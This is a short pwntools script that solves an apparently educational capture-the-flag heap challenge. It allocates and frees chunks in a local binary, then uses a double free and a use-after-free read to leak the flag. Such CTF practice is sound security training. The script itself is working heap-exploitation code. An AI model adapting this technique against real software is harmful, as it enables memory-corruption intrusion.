#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.log_level == "error"

elf = context.binary = ELF("/challenge/malloc-mirage-hard")

def malloc(io,index,size):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/puts_flag/quit):")
    print(data.decode())
    io.sendline(b"malloc")
    i = io.recvuntil(b"Index:")
    print(i.decode())
    io.sendline(str(index).encode())
    s = io.recvuntil(b"Size:")
    print(s.decode())
    io.sendline(str(size).encode())
    return io

def puts(io,index):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/puts_flag/quit):")
    print(data.decode('latin-1'))
    io.sendline(b"puts")
    io.sendlineafter(b"Index:",str(index).encode())
    return io,data

def free(io,index):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/puts_flag/quit):")
    print(data.decode())
    io.sendline(b"free")
    io.sendlineafter(b"Index:",str(index).encode())
    return io

def read_flag(io):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/puts_flag/quit):")
    print(data.decode())
    io.sendline(b"read_flag")
    return io

def quit(io):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/puts_flag/quit):")
    print(data.decode())
    io.sendline(b"quit")
    return io

def puts_flag(io,index):
    data = io.recvuntil(b"Function (malloc/free/puts/read_flag/puts_flag/quit):")
    print(data.decode())
    io.sendline(b"puts_flag")
    print(io.recvline().decode())
    return io


def main():
    io = process()
    io = malloc(io,0,0x348)
    io = malloc(io,1,0x348)
    io = free(io,0)
    io = free(io,1)
    io = read_flag(io)
    io = free(io,1)
    io= puts_flag(io,1)
    io = quit(io)
    io.close()

if __name__ == "__main__":
    main()


io = process()
